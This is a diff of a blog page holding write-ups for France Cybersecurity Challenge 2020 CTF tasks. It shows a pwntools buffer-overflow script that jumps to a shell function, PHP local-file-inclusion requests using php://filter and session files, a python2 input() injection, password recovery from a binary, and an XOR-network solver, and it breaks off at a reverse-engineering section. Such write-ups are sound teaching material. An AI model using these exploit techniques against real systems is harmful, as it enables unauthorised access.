@@ -96,20 +96,101 @@ if (!doNotTrack) {
 <div class="content-wrapper">
   <main>
     <p>This are little write-ups for challenges of the <a href="https://www.ssi.gouv.fr/actualite/participez-au-france-cybersecurity-challenge-fcsc-et-qualifiez-vous-pour-integrer-lequipe-france/">France Cybersecurity Challenge CTF</a> of 2020.</p>
-<h1 id="revision">Revision</h1>
-<p>We are greeted with a website where we can upload two files. We have access part of the source code. Reading it we understand that the website:</p>
-<ul>
-<li>computes the SHA-1 hash of both files</li>
-<li>checks if the computed hashes are in a database</li>
-<li>prints the flag if both files have the same hash</li>
-</ul>
-<p>Testing the application we find out that it only accepts pdf files.</p>
-<p>Doing a little bit of research, we find that <a href="https://shattered.it">SHA-1 is vulnerable to collision attacks</a> and that we can create two different pdf files with the same SHA-1 hash. Two example pdfs are included in the website.</p>
-<p>Uploading them to the application gives:</p>
-<pre><code>Un des documents existe déjà dans la base de données. Vous semblez être sur la bonne voie...
-</code></pre><p>Now we need to find out how to modify the pdfs so that they compute the same hashes without them being in the database. Reading a little bit more, the website shows how they leveraged the pdf format by including <a href="https://shattered.it/static/pdf_format.png">this picture</a>. We understand that the only thing we have to do is to append some bytes to both pdfs and the hashes will remain the same. Appending <code>0xdeadbeef</code> to both documents and uploading them gives us the flag:</p>
-<pre><code>Bravo, vous avez trouvé une collision sha1 pour le fichier &quot;a305abf22d2e1568b33cdfb15d8fc29a34e8be28&quot; : FCSC{8f95b0fc1a793e102a65bae9c473e9a3c2893cf083a539636b082605c40c00c1}
-</code></pre><h1 id="babel-web">Babel Web</h1>
+<hr>
+<h1 id="intro">Intro</h1>
+<h2 id="le-rat-conteur">Le rat conteur</h2>
+<div class="highlight"><pre style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">openssl enc -aes-128-ctr -d -in flag.jpg.enc -out flag.jpg -K 00112233445566778899aabbccddeeff -iv <span style="color:#b452cd">0000000000000000</span>
+</code></pre></div><h2 id="poney">Poney</h2>
+<h3 id="file-information">File information</h3>
+<pre><code>poney: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=06fdfc3c264bdc167a0855288210c06e16ce805e, not stripped
+</code></pre><h3 id="elf-info">ELF info</h3>
+<pre><code>ELF Header:
+  Magic:   7f 45 4c 46 02 01 01 00 00 00 00 00 00 00 00 00 
+  Class:                             ELF64
+  Data:                              2's complement, little endian
+  Version:                           1 (current)
+  OS/ABI:                            UNIX - System V
+  ABI Version:                       0
+  Type:                              EXEC (Executable file)
+  Machine:                           Advanced Micro Devices X86-64
+  Version:                           0x1
+  Entry point address:               0x400580
+  Start of program headers:          64 (bytes into file)
+  Start of section headers:          6616 (bytes into file)
+  Flags:                             0x0
+  Size of this header:               64 (bytes)
+  Size of program headers:           56 (bytes)
+  Number of program headers:         9
+  Size of section headers:           64 (bytes)
+  Number of section headers:         29
+  Section header string table index: 28
+
+Entry point address: 0x400580
+</code></pre><h3 id="elf-security">ELF security</h3>
+<pre><code>'/root/fcsc/poney/poney'
+Arch:     amd64-64-little
+RELRO:    Full RELRO
+Stack:    No canary found
+NX:       NX enabled
+PIE:      No PIE (0x400000)
+</code></pre><p>No execute is enabled.</p>
+<p>There is a <code>shell</code> function at adress <code>0x0000000000400676</code>. The main function uses function <code>scanf</code>. We can do a buffer overflow to execute the <code>shell</code> function:</p>
+<div class="highlight"><pre style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#8b008b;font-weight:bold">from</span> <span style="color:#008b45;text-decoration:underline">pwn</span> <span style="color:#8b008b;font-weight:bold">import</span> *
+
+shell_address=p64(<span style="color:#b452cd">0x0000000000400676</span>)
+<span style="color:#8b008b;font-weight:bold">for</span> i <span style="color:#8b008b">in</span> <span style="color:#658b00">range</span>(<span style="color:#b452cd">0</span>, <span style="color:#b452cd">128</span>):
+	log.info(f<span style="color:#cd5555">&#34;Offset is {i}&#34;</span>)
+	binary=remote(<span style="color:#cd5555">&#34;challenges1.france-cybersecurity-challenge.fr&#34;</span>, <span style="color:#b452cd">4000</span>)
+	<span style="color:#8b008b;font-weight:bold">print</span>(binary.recvuntil(<span style="color:#cd5555">&#39;&gt;&gt;&gt;&#39;</span>))
+	binary.sendline(<span style="color:#cd5555">b</span><span style="color:#cd5555">&#39;a&#39;</span>*i + shell_address)
+	binary.interactive()
+</code></pre></div><h2 id="tartetatin">TarteTatin</h2>
+<p>Opening up the binary in ghidra, we see the main function disassembled as:</p>
+<div class="highlight"><pre style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">ulong <span style="color:#008b45">main</span>(<span style="color:#00688b;font-weight:bold">void</span>)
+
+{
+  <span style="color:#00688b;font-weight:bold">int</span> iVar1;
+  <span style="color:#00688b;font-weight:bold">long</span> in_FS_OFFSET;
+  <span style="color:#00688b;font-weight:bold">char</span> local_38 [<span style="color:#b452cd">40</span>];
+  <span style="color:#00688b;font-weight:bold">long</span> local_10;
+  
+  local_10 = *(<span style="color:#00688b;font-weight:bold">long</span> *)(in_FS_OFFSET + <span style="color:#b452cd">0x28</span>);
+  fgets(local_38,<span style="color:#b452cd">0x20</span>,stdin);
+  transform(local_38);
+  iVar1 = memcmp(local_38,pass_enc,<span style="color:#b452cd">0x10</span>);
+  <span style="color:#8b008b;font-weight:bold">if</span> (iVar1 == <span style="color:#b452cd">0</span>) {
+    transform(flag_enc);
+    puts(flag_enc);
+  }
+  <span style="color:#8b008b;font-weight:bold">if</span> (local_10 == *(<span style="color:#00688b;font-weight:bold">long</span> *)(in_FS_OFFSET + <span style="color:#b452cd">0x28</span>)) {
+    <span style="color:#8b008b;font-weight:bold">return</span> (ulong)(iVar1 == <span style="color:#b452cd">0</span>);
+  }
+                    <span style="color:#228b22">/* WARNING: Subroutine does not return */</span>
+  __stack_chk_fail();
+}
+</code></pre></div><p>So our input is goes through a <code>transform</code> function before being compared to a <code>pass_enc</code> variable. The <code>transform</code> is disassembled as:</p>
+<div class="highlight"><pre style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#00688b;font-weight:bold">void</span> <span style="color:#008b45">transform</span>(<span style="color:#00688b;font-weight:bold">char</span> *param_1) {
+  <span style="color:#00688b;font-weight:bold">char</span> *pcVar1;
+  <span style="color:#00688b;font-weight:bold">char</span> *local_10;
+  
+  local_10 = param_1;
+  <span style="color:#8b008b;font-weight:bold">do</span> {
+    pcVar1 = local_10 + <span style="color:#b452cd">1</span>;
+    *local_10 = *local_10 + <span style="color:#cd5555">&#39;\x01&#39;</span>;
+    local_10 = pcVar1;
+  } <span style="color:#8b008b;font-weight:bold">while</span> (*pcVar1 != <span style="color:#cd5555">&#39;\0&#39;</span>);
+  <span style="color:#8b008b;font-weight:bold">return</span>;
+}
+</code></pre></div><p>It&rsquo;s a simple function that adds 1 to the ASCII code of every char of the string in the parameters. Using gdb, we find that the <code>pass_enc</code> variable is equal to <code>NzTfdvs4Q4ttx1se\340\a\371\367\377\177</code>. Using a quick python script, we find the password:</p>
+<div class="highlight"><pre style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">pass_enc = <span style="color:#cd5555">&#34;NzTfdvs4Q4ttx1se</span><span style="color:#cd5555">\340\a\371\367\377\177</span><span style="color:#cd5555">&#34;</span>
+<span style="color:#8b008b;font-weight:bold">for</span> i <span style="color:#8b008b">in</span> pass_enc:
+  <span style="color:#8b008b;font-weight:bold">print</span>(<span style="color:#658b00">chr</span>(<span style="color:#658b00">ord</span>(i)-<span style="color:#b452cd">1</span>), end=<span style="color:#cd5555">&#34;&#34;</span>)
+
+MySecur3P3ssw0rdßøöþ~
+</code></pre></div><p>Running the script with the password we found gives us the flag:</p>
+<pre><code>Well done! The flag is:
+FCSC{83f41431c111062d003dd0213cf824d66f770a0be1305e2813f15dd76503a91d}
+</code></pre><h2 id="babel-web">Babel Web</h2>
 <p>We get greeted with a website telling us welcome. In the source, we find:</p>
 <div class="highlight"><pre style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html"><span style="color:#228b22">&lt;!-- &lt;a href=&#34;?source=1&#34;&gt;source&lt;/a&gt; --&gt;</span>
 </code></pre></div><p>which gives us a hint that the php source file can be accessed with the URL parameter source:</p>
@@ -127,78 +208,183 @@ if (!doNotTrack) {
 &lt;pre&gt;&lt;?php
         <span style="color:#00688b">$flag</span> = <span style="color:#cd5555">&#34;FCSC{5d969396bb5592634b31d4f0846d945e4befbb8c470b055ef35c0ac090b9b8b7}&#34;</span>;
 &lt;pre&gt;
-</code></pre></div><h1 id="bestiary">Bestiary</h1>
-<p>We are greeted with a website that lets us see information about beasts. The information is retrieved by the URL parameter <code>monster</code>. Using the php wrap <code>filter</code> allows to get the source of the <code>index.php</code> file base64 encoded:</p>
-<pre><code>GET /index.php?monster=php://filter/read=convert.base64-encode/resource=index.php
-</code></pre><p>When we decode the reponse we get:</p>
-<div class="highlight"><pre style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#1e889b">&lt;?php</span>
-	session_save_path(<span style="color:#cd5555">&#34;./sessions/&#34;</span>);
-	session_start();
-	<span style="color:#8b008b;font-weight:bold">include_once</span>(<span style="color:#cd5555">&#39;flag.php&#39;</span>);
-<span style="color:#1e889b">?&gt;</span>
-&lt;<span style="color:#8b008b;font-weight:bold">html</span>&gt;
-&lt;<span style="color:#8b008b;font-weight:bold">head</span>&gt;
-	&lt;<span style="color:#8b008b;font-weight:bold">title</span>&gt;Bestiary&lt;/<span style="color:#8b008b;font-weight:bold">title</span>&gt;
-&lt;/<span style="color:#8b008b;font-weight:bold">head</span>&gt;
-&lt;<span style="color:#8b008b;font-weight:bold">body</span> <span style="color:#658b00">style</span>=<span style="color:#cd5555">&#34;background-color:#3CB371;&#34;</span>&gt;
-&lt;<span style="color:#8b008b;font-weight:bold">center</span>&gt;&lt;<span style="color:#8b008b;font-weight:bold">h1</span>&gt;Bestiary&lt;/<span style="color:#8b008b;font-weight:bold">h1</span>&gt;&lt;/<span style="color:#8b008b;font-weight:bold">center</span>&gt;
-&lt;<span style="color:#8b008b;font-weight:bold">script</span>&gt;
-<span style="color:#8b008b;font-weight:bold">function</span> show()
-{
-	<span style="color:#8b008b;font-weight:bold">var</span> monster = <span style="color:#658b00">document</span>.getElementById(<span style="color:#cd5555">&#34;monster&#34;</span>).value;
-	<span style="color:#658b00">document</span>.location.href = <span style="color:#cd5555">&#34;index.php?monster=&#34;</span>+monster;
-}
-&lt;/<span style="color:#8b008b;font-weight:bold">script</span>&gt;
+</code></pre></div><hr>
+<h1 id="misc">Misc</h1>
+<h2 id="randomito">Randomito</h2>
+<p>We have the source file: it&rsquo;s a python2 script that uses the <code>input</code> function instead of the <code>raw_input</code> function. We are supposed to guess two random numbers that are stored in two variables <code>secret_a</code> and <code>secret_b</code>. We can supply those to the script and we get the flag:</p>
+<pre><code>[+] Generating a 128-bit random secret (a, b)
+[+] Done! Now, try go guess it!
+&gt;&gt;&gt; a = secret_a
+&gt;&gt;&gt; b = secret_b
+[-] Trying 6df3fb4a206cdf56a6a0422880e82044
+[+] Well done! Here is the flag: FCSC{4496d11d19db92ae53e0b9e9415d99d877ebeaeab99e9e875ac346c73e8aca77}
+</code></pre><h2 id="baby-xoring-networks">Baby Xoring Networks</h2>
+<p>We are given 4 initial $n$-bit numbers and 4 final $n$-bit numbers:</p>
+<p><img src="/images/fcsc/bxn_instance.png" alt="Instance of a problem"></p>
+<p>We need to find the right combination of at most $m$ XOR gates so that the four initial numbers become the 4 final numbers after permutations.</p>
+<p><img src="/images/fcsc/bxn_instance.png" alt="Solution of the previous instance"></p>
+<p>The challenge starts off with 4-bit numbers and the last instance has 6-bit numbers.</p>
+<p>One method to solve this was just iterating through all the possible cases, but the last instance was a hit or miss. A better solution was to perform a <a href="https://en.wikipedia.org/wiki/Meet-in-the-middle_attack">meet-in-the-middle attack</a> (MITM). For now, let&rsquo;s forget the final permutations and the fact that we have to make a 90 degree rotation to get the real numbers getting XORed.</p>
+<p>Because we know what the final numbers are, we can divide the problem in two and get way faster results:</p>
+<ul>
+<li>store in memory all the possible 4 numbers made with $\frac{m}{2}$ XOR gates starting from the initial numbers (and the combination of XOR-gates that created this output)</li>
+<li>store in memory for all the possible permutations of the final numbers, get all the possible 4 numbers made with $\frac{m-frac{m}{2}}$ XOR gates starting from the final numbers (and the combination of XOR-gates that created this output)</li>
+<li>compare the two: if they are exactly the same four numbers and in the same order, it means that we have found a solution</li>
+</ul>
+<p>The only thing that we need in order to make this work is to make a function that will parse the problem from the server and another one to find the right permutations, which is an easy task.</p>
+<div class="highlight"><pre style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#8b008b;font-weight:bold">from</span> <span style="color:#008b45;text-decoration:underline">pwn</span> <span style="color:#8b008b;font-weight:bold">import</span> *
+<span style="color:#8b008b;font-weight:bold">import</span> <span style="color:#008b45;text-decoration:underline">numpy</span> <span style="color:#8b008b;font-weight:bold">as</span> <span style="color:#008b45;text-decoration:underline">np</span>
+<span style="color:#8b008b;font-weight:bold">import</span> <span style="color:#008b45;text-decoration:underline">itertools</span>
 
-&lt;<span style="color:#8b008b;font-weight:bold">p</span>&gt;
-<span style="color:#1e889b">&lt;?php</span>
-	<span style="color:#00688b">$monster</span> = <span style="color:#8b008b;font-weight:bold">NULL</span>;
+<span style="color:#8b008b;font-weight:bold">class</span> <span style="color:#008b45;font-weight:bold">Network</span>:
+    <span style="color:#8b008b;font-weight:bold">def</span> __init__(self, n, M, A, end=False):
+        self.n = n
+        self.c_n = <span style="color:#b452cd">0</span>
+        <span style="color:#8b008b;font-weight:bold">for</span> i <span style="color:#8b008b">in</span> <span style="color:#658b00">range</span>(<span style="color:#b452cd">1</span>, n):
+            self.c_n += i
+        self.M = M
+        self.A = A
+        self.solutions = {}
+        self.end = end
 
-	<span style="color:#8b008b;font-weight:bold">if</span>(isset(<span style="color:#00688b">$_SESSION</span>[<span style="color:#cd5555">&#39;monster&#39;</span>]) &amp;&amp; !<span style="color:#8b008b;font-weight:bold">empty</span>(<span style="color:#00688b">$_SESSION</span>[<span style="color:#cd5555">&#39;monster&#39;</span>]))
-		<span style="color:#00688b">$monster</span> = <span style="color:#00688b">$_SESSION</span>[<span style="color:#cd5555">&#39;monster&#39;</span>];
-	<span style="color:#8b008b;font-weight:bold">if</span>(isset(<span style="color:#00688b">$_GET</span>[<span style="color:#cd5555">&#39;monster&#39;</span>]) &amp;&amp; !<span style="color:#8b008b;font-weight:bold">empty</span>(<span style="color:#00688b">$_GET</span>[<span style="color:#cd5555">&#39;monster&#39;</span>]))
-	{
-		<span style="color:#00688b">$monster</span> = <span style="color:#00688b">$_GET</span>[<span style="color:#cd5555">&#39;monster&#39;</span>];
-		<span style="color:#00688b">$_SESSION</span>[<span style="color:#cd5555">&#39;monster&#39;</span>] = <span style="color:#00688b">$monster</span>;
-	}
+    <span style="color:#8b008b;font-weight:bold">def</span> <span style="color:#008b45">get_solutions</span>(self, i):
+        self.solutions = {}
+        poss_xor = <span style="color:#658b00">list</span>(itertools.permutations(<span style="color:#658b00">range</span>(self.n), <span style="color:#b452cd">2</span>))
+        poss_comb = itertools.permutations(poss_xor, i)
+        <span style="color:#8b008b;font-weight:bold">for</span> j <span style="color:#8b008b">in</span> poss_comb:
+            temp_a = self.A[:]
+            <span style="color:#8b008b;font-weight:bold">for</span> k <span style="color:#8b008b">in</span> j:
+                temp_a[k[<span style="color:#b452cd">0</span>]] = temp_a[k[<span style="color:#b452cd">0</span>]] ^ temp_a[k[<span style="color:#b452cd">1</span>]]
+            self.solutions[j] = <span style="color:#658b00">bytes</span>(temp_a)
 
-	<span style="color:#8b008b;font-weight:bold">if</span>(<span style="color:#00688b">$monster</span> !== <span style="color:#8b008b;font-weight:bold">NULL</span> &amp;&amp; strpos(<span style="color:#00688b">$monster</span>, <span style="color:#cd5555">&#34;flag&#34;</span>) === <span style="color:#8b008b;font-weight:bold">False</span>)
-		<span style="color:#8b008b;font-weight:bold">include</span>(<span style="color:#00688b">$monster</span>);
-	<span style="color:#8b008b;font-weight:bold">else</span>
-		<span style="color:#8b008b;font-weight:bold">echo</span> <span style="color:#cd5555">&#34;Select a monster to read his description.&#34;</span>;
-<span style="color:#1e889b">?&gt;</span>
-&lt;/<span style="color:#8b008b;font-weight:bold">p</span>&gt;
+<span style="color:#8b008b;font-weight:bold">def</span> <span style="color:#008b45">check_solution</span>(solution1, solution2):
+    middle = <span style="color:#658b00">set</span>(v <span style="color:#8b008b;font-weight:bold">for</span> k, v <span style="color:#8b008b">in</span> <span style="color:#658b00">sorted</span>(solution1.items(), key=<span style="color:#8b008b;font-weight:bold">lambda</span> item: item[<span style="color:#b452cd">1</span>]))
+    second_middle = <span style="color:#658b00">set</span>(v <span style="color:#8b008b;font-weight:bold">for</span> k, v <span style="color:#8b008b">in</span> <span style="color:#658b00">sorted</span>(solution2.items(), key=<span style="color:#8b008b;font-weight:bold">lambda</span> item: item[<span style="color:#b452cd">1</span>]))
+    <span style="color:#8b008b;font-weight:bold">if</span> <span style="color:#658b00">len</span>(middle.intersection(second_middle)) &gt; <span style="color:#b452cd">0</span>:
+        <span style="color:#8b008b;font-weight:bold">return</span> <span style="color:#658b00">list</span>(middle.intersection(second_middle))[<span style="color:#b452cd">0</span>]
+    <span style="color:#8b008b;font-weight:bold">return</span> False
 
-&lt;<span style="color:#8b008b;font-weight:bold">select</span> <span style="color:#658b00">id</span>=<span style="color:#cd5555">&#34;monster&#34;</span>&gt;
-	&lt;<span style="color:#8b008b;font-weight:bold">option</span> <span style="color:#658b00">value</span>=<span style="color:#cd5555">&#34;beholder&#34;</span>&gt;Beholder&lt;/<span style="color:#8b008b;font-weight:bold">option</span>&gt;
-	&lt;<span style="color:#8b008b;font-weight:bold">option</span> <span style="color:#658b00">value</span>=<span style="color:#cd5555">&#34;displacer_beast&#34;</span>&gt;Displacer Beast&lt;/<span style="color:#8b008b;font-weight:bold">option</span>&gt;
-	&lt;<span style="color:#8b008b;font-weight:bold">option</span> <span style="color:#658b00">value</span>=<span style="color:#cd5555">&#34;mimic&#34;</span>&gt;Mimic&lt;/<span style="color:#8b008b;font-weight:bold">option</span>&gt;
-	&lt;<span style="color:#8b008b;font-weight:bold">option</span> <span style="color:#658b00">value</span>=<span style="color:#cd5555">&#34;rust_monster&#34;</span>&gt;Rust Monster&lt;/<span style="color:#8b008b;font-weight:bold">option</span>&gt;
-	&lt;<span style="color:#8b008b;font-weight:bold">option</span> <span style="color:#658b00">value</span>=<span style="color:#cd5555">&#34;gelatinous_cube&#34;</span>&gt;Gelatinous Cube&lt;/<span style="color:#8b008b;font-weight:bold">option</span>&gt;
-	&lt;<span style="color:#8b008b;font-weight:bold">option</span> <span style="color:#658b00">value</span>=<span style="color:#cd5555">&#34;owlbear&#34;</span>&gt;Owlbear&lt;/<span style="color:#8b008b;font-weight:bold">option</span>&gt;
-	&lt;<span style="color:#8b008b;font-weight:bold">option</span> <span style="color:#658b00">value</span>=<span style="color:#cd5555">&#34;lich&#34;</span>&gt;Lich&lt;/<span style="color:#8b008b;font-weight:bold">option</span>&gt;
-	&lt;<span style="color:#8b008b;font-weight:bold">option</span> <span style="color:#658b00">value</span>=<span style="color:#cd5555">&#34;the_drow&#34;</span>&gt;The Drow&lt;/<span style="color:#8b008b;font-weight:bold">option</span>&gt;
-	&lt;<span style="color:#8b008b;font-weight:bold">option</span> <span style="color:#658b00">value</span>=<span style="color:#cd5555">&#34;mind_flayer&#34;</span>&gt;Mind Flayer&lt;/<span style="color:#8b008b;font-weight:bold">option</span>&gt;
-	&lt;<span style="color:#8b008b;font-weight:bold">option</span> <span style="color:#658b00">value</span>=<span style="color:#cd5555">&#34;tarrasque&#34;</span>&gt;Tarrasque&lt;/<span style="color:#8b008b;font-weight:bold">option</span>&gt;
-&lt;/<span style="color:#8b008b;font-weight:bold">select</span>&gt; &lt;<span style="color:#8b008b;font-weight:bold">input</span> <span style="color:#658b00">type</span>=<span style="color:#cd5555">&#34;button&#34;</span> <span style="color:#658b00">value</span>=<span style="color:#cd5555">&#34;show description&#34;</span> <span style="color:#658b00">onclick</span>=<span style="color:#cd5555">&#34;show()&#34;</span>&gt;
-&lt;<span style="color:#8b008b;font-weight:bold">div</span> <span style="color:#658b00">style</span>=<span style="color:#cd5555">&#34;font-size:70%&#34;</span>&gt;Source : https://io9.gizmodo.com/the-10-most-memorable-dungeons-dragons-monsters-1326074030&lt;/<span style="color:#8b008b;font-weight:bold">div</span>&gt;&lt;<span style="color:#8b008b;font-weight:bold">br</span> /&gt;
-&lt;/<span style="color:#8b008b;font-weight:bold">body</span>&gt;
-&lt;/<span style="color:#8b008b;font-weight:bold">html</span>&gt;
-</code></pre></div><p>Sessions are stored in the sessions directory, so we can access it by requesting:</p>
-<pre><code>GET /index.php?monster=sessions/sess\_{PHPSESSID}
+<span style="color:#8b008b;font-weight:bold">def</span> <span style="color:#008b45">hex_to_binarray</span>(hex_str, n):
+    bin_str = <span style="color:#658b00">bin</span>(<span style="color:#658b00">int</span>(hex_str, <span style="color:#b452cd">16</span>))
+    bin_list = <span style="color:#658b00">list</span>(<span style="color:#658b00">int</span>(i) <span style="color:#8b008b;font-weight:bold">for</span> i <span style="color:#8b008b">in</span> bin_str[<span style="color:#b452cd">2</span>:].zfill(n))
+    <span style="color:#8b008b;font-weight:bold">return</span> bin_list[::-<span style="color:#b452cd">1</span>]
+
+<span style="color:#8b008b;font-weight:bold">def</span> <span style="color:#008b45">make_permutations</span>(real_solution, partial_solution):
+    ret_list = []
+    temp_permutations = real_solution[:]
+    <span style="color:#8b008b;font-weight:bold">for</span> i <span style="color:#8b008b">in</span> partial_solution:
+        ret_list.append(temp_permutations.index(i))
+        temp_permutations[ret_list[-<span style="color:#b452cd">1</span>]] = None
+    <span style="color:#8b008b;font-weight:bold">return</span> ret_list[::-<span style="color:#b452cd">1</span>]
+
+<span style="color:#8b008b;font-weight:bold">def</span> <span style="color:#008b45">translate_problem</span>(A, n):
+    A = np.rot90(np.array(<span style="color:#658b00">list</span>(hex_to_binarray(i, n) <span style="color:#8b008b;font-weight:bold">for</span> i <span style="color:#8b008b">in</span> A)))
+    A_translated = <span style="color:#658b00">list</span>(<span style="color:#658b00">int</span>(<span style="color:#cd5555">&#39;&#39;</span>.join(<span style="color:#658b00">map</span>(<span style="color:#658b00">str</span>, i)), <span style="color:#b452cd">2</span>) <span style="color:#8b008b;font-weight:bold">for</span> i <span style="color:#8b008b">in</span> A)
+    <span style="color:#8b008b;font-weight:bold">return</span> A_translated
+
+<span style="color:#cd5555">&#34;&#34;&#34;
+</span><span style="color:#cd5555">hex_to_binarray(&#34;0x4&#34;, 4)
+</span><span style="color:#cd5555">translate_problem([&#34;0xc&#34;, &#34;0x4&#34;, &#34;0xa&#34;, &#34;0x7&#34;], [&#34;0xc&#34;, &#34;0xb&#34;, &#34;0xa&#34;, &#34;0x8&#34;], 4)
+</span><span style="color:#cd5555">&#34;&#34;&#34;</span>
+<span style="color:#8b008b;font-weight:bold">def</span> <span style="color:#008b45">find_solution</span>(n, M, A, B):
+    problem = Network(n, M//<span style="color:#b452cd">2</span>, translate_problem(A, n))
+    <span style="color:#8b008b;font-weight:bold">for</span> k <span style="color:#8b008b">in</span> <span style="color:#658b00">range</span>(<span style="color:#b452cd">1</span>, M//<span style="color:#b452cd">2</span> + <span style="color:#b452cd">1</span>):
+        problem.get_solutions(k)
+        possible_permutations = itertools.permutations(translate_problem(B, n))
+        possible_permutations = [<span style="color:#658b00">list</span>(i) <span style="color:#8b008b;font-weight:bold">for</span> i <span style="color:#8b008b">in</span> possible_permutations]
+        <span style="color:#8b008b;font-weight:bold">for</span> i <span style="color:#8b008b">in</span> possible_permutations:
+            problem2 = Network(n, M-M//<span style="color:#b452cd">2</span>, i)
+            <span style="color:#8b008b;font-weight:bold">for</span> j <span style="color:#8b008b">in</span> <span style="color:#658b00">range</span>(<span style="color:#b452cd">0</span>, M-M//<span style="color:#b452cd">2</span>):
+                problem2.get_solutions(j)
+                solution = check_solution(problem.solutions, problem2.solutions)
+                <span style="color:#8b008b;font-weight:bold">if</span> solution:
+                    moves = []
+                    <span style="color:#8b008b;font-weight:bold">for</span> k, v <span style="color:#8b008b">in</span> problem.solutions.items():
+                        <span style="color:#8b008b;font-weight:bold">if</span> solution==v:
+                            moves.extend(k)
+                            <span style="color:#8b008b;font-weight:bold">break</span>
+                    <span style="color:#8b008b;font-weight:bold">for</span> k, v <span style="color:#8b008b">in</span> problem2.solutions.items():
+                        <span style="color:#8b008b;font-weight:bold">if</span> solution==v:
+                            moves.extend(k[::-<span style="color:#b452cd">1</span>])
+                            <span style="color:#8b008b;font-weight:bold">return</span> <span style="color:#658b00">len</span>(moves), moves, make_permutations(translate_problem(B, n), i)
+
+<span style="color:#cd5555">&#34;&#34;&#34;
+</span><span style="color:#cd5555">#m, moves, permutations = find_solution(4, 6, [&#39;0xf&#39;, &#39;0xe&#39;, &#39;0x7&#39;, &#39;0xa&#39;], [&#39;0x8&#39;, &#39;0xa&#39;, &#39;0x1&#39;, &#39;0x6&#39;])
+</span><span style="color:#cd5555">m, moves, permutations = find_solution(4, 6, [&#39;0xe&#39;, &#39;0x7&#39;, &#39;0x8&#39;, &#39;0x5&#39;], [&#39;0x4&#39;, &#39;0xe&#39;, &#39;0x7&#39;, &#39;0x5&#39;])
+</span><span style="color:#cd5555">
+</span><span style="color:#cd5555">print(m)
+</span><span style="color:#cd5555">print(moves)
+</span><span style="color:#cd5555">print(permutations)
+</span><span style="color:#cd5555">&#34;&#34;&#34;</span>
+
+r = remote(<span style="color:#cd5555">&#34;challenges2.france-cybersecurity-challenge.fr&#34;</span>, <span style="color:#b452cd">6007</span>)
+<span style="color:#8b008b;font-weight:bold">while</span> True:
+    <span style="color:#8b008b;font-weight:bold">try</span>:
+        <span style="color:#8b008b;font-weight:bold">print</span>(r.recvuntil(<span style="color:#cd5555">b</span><span style="color:#cd5555">&#34;--------- BEGIN XNP ---------</span><span style="color:#cd5555">\n</span><span style="color:#cd5555">&#34;</span>))
+        n = <span style="color:#658b00">int</span>(r.recvuntil(<span style="color:#cd5555">b</span><span style="color:#cd5555">&#34;</span><span style="color:#cd5555">\n</span><span style="color:#cd5555">&#34;</span>)[:-<span style="color:#b452cd">1</span>].decode())
+        M = <span style="color:#658b00">int</span>(r.recvuntil(<span style="color:#cd5555">b</span><span style="color:#cd5555">&#34;</span><span style="color:#cd5555">\n</span><span style="color:#cd5555">&#34;</span>)[:-<span style="color:#b452cd">1</span>].decode())
+        a = []
+        b = []
+
+        <span style="color:#8b008b;font-weight:bold">for</span> i <span style="color:#8b008b">in</span> <span style="color:#658b00">range</span>(n):
+            a_t, b_t = r.recvuntil(<span style="color:#cd5555">b</span><span style="color:#cd5555">&#34;</span><span style="color:#cd5555">\n</span><span style="color:#cd5555">&#34;</span>)[:-<span style="color:#b452cd">1</span>].decode().split(<span style="color:#cd5555">&#39; &#39;</span>)
+            a.append(a_t)
+            b.append(b_t)
+
+        log.info(f<span style="color:#cd5555">&#34;Solving: {n}, {M}, {a}, {b}&#34;</span>)
+        m, moves, permutations = find_solution(n, M, a, b)
+        <span style="color:#228b22">#log.info(f&#34;Solved with {m} XOR gates: {n}, {M}, {translate_problem(a, n)}, {translate_problem(b, n)}&#34;)</span>
+        log.info(f<span style="color:#cd5555">&#34;Solved with {m} XOR gates: {n}, {M}, {a}, {b}&#34;</span>)
+
+        log.info(<span style="color:#cd5555">&#34;----- BEGIN XNP SOLUTION -----&#34;</span>)
+        log.info(f<span style="color:#cd5555">&#34;{m}&#34;</span>)
+        <span style="color:#8b008b;font-weight:bold">for</span> i <span style="color:#8b008b">in</span> moves:
+            log.info(<span style="color:#cd5555">&#34;{} {}&#34;</span>.format(i[<span style="color:#b452cd">0</span>], i[<span style="color:#b452cd">1</span>]))
+        <span style="color:#8b008b;font-weight:bold">for</span> i <span style="color:#8b008b">in</span> permutations:
+            log.info(<span style="color:#cd5555">&#34;{}&#34;</span>.format(i))
+        log.info(<span style="color:#cd5555">&#34;------ END XNP SOLUTION ------&#34;</span>)
+
+        r.sendline(<span style="color:#cd5555">b</span><span style="color:#cd5555">&#34;----- BEGIN XNP SOLUTION -----&#34;</span>)
+        r.sendline(<span style="color:#cd5555">&#34;{}&#34;</span>.format(m).encode())
+        <span style="color:#8b008b;font-weight:bold">for</span> i <span style="color:#8b008b">in</span> moves:
+            r.sendline(<span style="color:#cd5555">&#34;{} {}&#34;</span>.format(i[<span style="color:#b452cd">0</span>], i[<span style="color:#b452cd">1</span>]).encode())
+        <span style="color:#8b008b;font-weight:bold">for</span> i <span style="color:#8b008b">in</span> permutations:
+            r.sendline(<span style="color:#cd5555">&#34;{}&#34;</span>.format(i).encode())
+        r.sendline(<span style="color:#cd5555">b</span><span style="color:#cd5555">&#34;------ END XNP SOLUTION ------&#34;</span>)
+    <span style="color:#8b008b;font-weight:bold">except</span>:
+        r.interactive()
+</code></pre></div><hr>
+<h1 id="reverse">Reverse</h1>
+<h2 id="infiltrate">Infiltrate</h2>
+<p>We are given an image with only black and white pixels that are supposed to represent the blinking light of an HDD, so my first guess is that it represented a file. I used dcode to parse the images to bits and then translate them to a bytearray with the following python script:</p>
